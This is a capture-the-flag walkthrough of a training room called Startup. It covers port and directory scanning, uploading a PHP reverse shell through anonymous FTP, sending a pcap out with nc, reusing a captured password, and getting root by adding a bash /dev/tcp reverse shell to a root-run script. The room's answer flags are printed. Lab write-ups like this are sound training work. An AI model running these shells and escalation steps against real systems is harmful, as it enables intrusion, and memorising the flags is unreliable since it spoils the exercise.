# Startup Walkthrough
### Link
- https://tryhackme.com/room/startup
---
### Recon
```
nmap -sC -sC -p- [IP]
```
**Namp scan result**
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-14 19:49 EST
Nmap scan report for 10.10.81.82
Host is up (0.096s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.6.96.167
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```
sudo gobuster dir -u http://[IP] -w [Path]/directory-list-2.3-small.txt
```

**Gobuster scan Result**
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.81.82
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/laurentnebout/Documents/Tools/SecLists-master/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/14 19:50:38 Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 310] [--> http://10.10.81.82/files/]
```


Based on the **gobuster** result, I start to check all directories.

*/files*

We have 3 items

ftp folder : Empty
picture "important.jpg" : not interresting
notice.txt : We found the name **Maya**. We probably use it later ^^

Now, let's try to access the ftp by using *user:anonymous* and *password:anonymous* 
```
ftp anonymous@[IP]
```

That works.
```
Connected to 10.10.81.82.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```

Now, let's try to upload something.
- First: Create a basic text file with efw words
- Second: Connect to the ftp
- Third: Move to ftp folder
- Fourth: Upload the text file
- Fifth: Check from the browser --> That works !!!!

After this quick test, we have an opportunity to send a reverse shell file to gain access.

- First : Create your reverse shell php file. 
```
php -r '$sock=fsockopen("[Local machine IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'
```
- Second : Upload the file into **ftp** folder
- Third : Start a listener with the correct Port
- Fourth: Execute the script

```
$ whoami
www-data
$ ls -l
total 92
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Dec 15 00:46 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 125 root     root         0 Dec 15 00:46 proc
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
drwx------   4 root     root      4096 Nov 12  2020 root
drwxr-xr-x  25 root     root       900 Dec 15 01:19 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
dr-xr-xr-x  13 root     root         0 Dec 15 00:46 sys
drwxrwxrwt   7 root     root      4096 Dec 15 01:22 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
```

**Question**
#### What is the secret spicy soup recipe?

**Answer** 
#### love

**Question**
#### What are the contents of user.txt?

One folder drew my attention: **incidents**. Let's check the content.
```
$ cd incidents
$ ls -l
total 32
-rwxr-xr-x 1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
```

We have a network capture file. We can download and open it with **Wireshark**

**Download pcapng file**
- First: On the local machine, start a listener and specify the file you are waiting
```
nc -lvp 4444 > suspicious.pcapng
```
- Second: From the compromised machine, use the **nc** command and send the file
```
nc 10.6.96.167 4444 -w 3 < suspicious.pcapng
```

**Pcap analyze**
- First: Start Wireshark
- Second: Open the pcap file. It takes time to walk around all requests. Foirtunately, I found sonme interesting information in the **tcp.stream eq 7**. Right click --> Follow --> TCP Stream

```
www-data@startup:/$ cd home
cd home
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ ls
ls
lennie
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

sudo: 3 incorrect password attempts
www-data@startup:/home$ cat /etc/passwd
```
We have a password: **c4ntg3t3n0ughsp1c3** and the attacker tried this password but on the wrong user. Let's try this password for **lennie**

Now , we cannot execute the command **su**. This command is only available from a proper terminal. To resolve this issue, we have the appropriate command
``` 
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Now we have a proper terminal and we can connect to **lennie** user
```
www-data@startup:/incidents$ su lennie
su lennie
Password: c4ntg3t3n0ughsp1c3

lennie@startup:/incidents$ whoami
whoami
lennie
lennie@startup:/incidents$
```

Move to lennie directory and we have the user.txt flag ^^
```
lennie@startup:/incidents$ cd /home
cd /home
lennie@startup:/home$ ls
ls
lennie
lennie@startup:/home$ cd lennie
cd lennie
lennie@startup:~$ ls
ls
Documents  scripts  user.txt
lennie@startup:~$ cat user.txt
cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

**Answer**
###### THM{03ce3d619b80ccbfb3b7fc81e46c0e79}


**Question**
#### What are the contents of root.txt?

Let's check what command we can execute through **lennie** user
```
lennie@startup:~$ sudo -l
sudo -l
sudo: unable to resolve host startup
[sudo] password for lennie: c4ntg3t3n0ughsp1c3

Sorry, user lennie may not run sudo on startup.
```

Unfortunatelly, no command available. Continue to explore **lennie** directory. We have tow folders **Documents** and **scripts**.

**Documents** : 3 files but nothing interesting
**scripts** : **planner.sh** and **startup_list.sh**
```
lennie@startup:~/scripts$ ls -l
ls -l
total 8
-rwxr-xr-x 1 root root 77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root root  1 Dec 15 01:58 startup_list.txt
```

**planner.sh**
```
lennie@startup:~/scripts$ cat planner.sh
cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
This shell script call **print.sh**. Let's explore this script.
```
lennie@startup:~/scripts$ cat /etc/print.sh
cat /etc/print.sh
#!/bin/bash
echo "Done!"
```

Now we can update this script to gain root access. Use script from this [link](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

- First: Edit the file and add this line with the local IP machine and Port that we will use for the listener
```
lennie@startup:/etc$ cat print.sh
#!/bin/bash
#echo "Done!"
 /bin/bash -c 'bash -i >& /dev/tcp/IP/5555 0>&1'
 ```
- Second: Start a listener in the local machine and wait few seconds
```
nc -nlvp 5555
Connection from 10.10.81.82:59204
bash: cannot set terminal process group (2116): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# ls
ls
root.txt
root@startup:~# cat root.txt
cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
```
**Answer**
###### THM{f963aaa6a430f210222158ae15c3d76d}








